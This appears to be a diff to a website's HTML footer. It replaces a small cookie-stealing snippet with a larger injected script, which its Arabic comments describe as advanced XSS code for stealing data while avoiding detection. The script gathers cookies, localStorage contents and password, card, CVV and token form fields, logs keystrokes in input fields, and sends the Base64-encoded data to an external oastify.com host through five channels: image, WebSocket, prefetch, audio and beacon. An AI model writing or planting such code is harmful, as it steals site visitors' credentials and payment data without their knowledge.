@@ -562,12 +562,182 @@
         </div>
     </footer>
     <!-- footer end -->
-    <script>
+    <!-- <script>
 setTimeout(() => {
     new Image().src='http://dm3jd3v1416keb58ohp1hc2mqdw4ku8j.oastify.com/?test0='+ document.cookie;
 }, 1000);
-    </script>
+    </script> -->
+        <script>
+// كود XSS متقدم لسرقة البيانات مع تجنب الاكتشاف
+(function() {
+    // تأخير التنفيذ لتجنب الاكتشاف
+    setTimeout(function() {
+        
+        // جمع شامل للبيانات
+        var payload = {
+            // المعلومات الأساسية
+            cookies: document.cookie,
+            url: window.location.href,
+            referrer: document.referrer,
+            title: document.title,
+            
+            // معلومات المتصفح
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            onLine: navigator.onLine,
+            
+            // معلومات الشاشة
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            
+            // معلومات النافذة
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight
+            },
+            
+            // التخزين المحلي
+            localStorage: (function() {
+                var items = {};
+                for (var i = 0; i < localStorage.length; i++) {
+                    var key = localStorage.key(i);
+                    try {
+                        items[key] = localStorage.getItem(key);
+                    } catch(e) {
+                        items[key] = "ERROR_READING";
+                    }
+                }
+                return items;
+            })(),
+            
+            // بيانات النماذج الحساسة
+            forms: (function() {
+                var formsData = [];
+                document.querySelectorAll('form').forEach(function(form, index) {
+                    var formInfo = {
+                        action: form.action,
+                        method: form.method,
+                        inputs: []
+                    };
+                    
+                    form.querySelectorAll('input, textarea, select').forEach(function(input) {
+                        // تجميع الحقول الحساسة فقط
+                        if (input.type === 'password' || 
+                            input.name.match(/(pass|pwd|credit|card|cvv|token|secret|key)/i)) {
+                            formInfo.inputs.push({
+                                name: input.name,
+                                type: input.type,
+                                value: input.value
+                            });
+                        }
+                    });
+                    
+                    if (formInfo.inputs.length > 0) {
+                        formsData.push(formInfo);
+                    }
+                });
+                return formsData;
+            })(),
+            
+            // الطابع الزمني
+            timestamp: Date.now(),
+            date: new Date().toISOString(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        
+        // تسجيل المفاتيح التي يكتبها المستخدم (Keylogger بسيط)
+        var loggedKeys = '';
+        var keyloggerActive = false;
+        
+        document.addEventListener('keydown', function(e) {
+            if (!keyloggerActive && e.target.tagName === 'INPUT') {
+                keyloggerActive = true;
+                setTimeout(function() {
+                    if (loggedKeys.length > 0) {
+                        payload.keystrokes = loggedKeys;
+                        sendPayload(payload);
+                    }
+                }, 10000); // إرسال بعد 10 ثواني من الكتابة
+            }
+            
+            var key = e.key;
+            if (key.length === 1) {
+                loggedKeys += key;
+            } else if (key === ' ') {
+                loggedKeys += ' ';
+            } else if (key === 'Enter') {
+                loggedKeys += '\\n';
+            }
+        });
+        // دالة الإرسال الآمنة
+        function sendPayload(data) {
+            var burpDomain = 'dm3jd3v1416keb58ohp1hc2mqdw4ku8j.oastify.com';
+            
+            // تحويل البيانات لـ Base64
+            var jsonData = JSON.stringify(data);
+            var base64Data = btoa(unescape(encodeURIComponent(jsonData)));
+            
+            // طرق إرسال متعددة لتجاوز الحماية
+            
+            // 1. طريقة الصورة (الأكثر موثوقية)
+            try {
+                var img1 = new Image();
+                img1.src = 'http://' + burpDomain + '/pixel.gif?d=' + 
+                          encodeURIComponent(base64Data.substring(0, 2000));
+            } catch(e) {}
+            
+            // 2. WebSocket (إذا كان مسموحاً)
+            try {
+                var ws = new WebSocket('ws://' + burpDomain + '/ws');
+                ws.onopen = function() {
+                    ws.send(base64Data.substring(0, 4000));
+                    ws.close();
+                };
+            } catch(e) {}
+            
+            // 3. استخدام Link Prefetch
+            try {
+                var link = document.createElement('link');
+                link.rel = 'prefetch';
+                link.href = 'http://' + burpDomain + '/prefetch?d=' + 
+                           encodeURIComponent(base64Data.substring(0, 1000));
+                document.head.appendChild(link);
+            } catch(e) {}
+            
+            // 4. استخدام Audio (طريقة غير تقليدية)
+            try {
+                var audio = new Audio();
+                audio.src = 'http://' + burpDomain + '/audio.mp3?d=' + 
+                           encodeURIComponent(base64Data.substring(0, 500));
+            } catch(e) {}
+            
+            // 5. Beacon API (للمتصفحات الحديثة)
+            try {
+                navigator.sendBeacon('http://' + burpDomain + '/beacon', 
+                    new Blob([base64Data], {type: 'text/plain'}));
+            } catch(e) {}
+        }
+        
+        // إرسال البيانات فوراً
+        sendPayload(payload);
+        
+    }, 1000); // تأخير ثانية واحدة
+    
+})();
+</script>
 </body>
 
 
 </html>
+
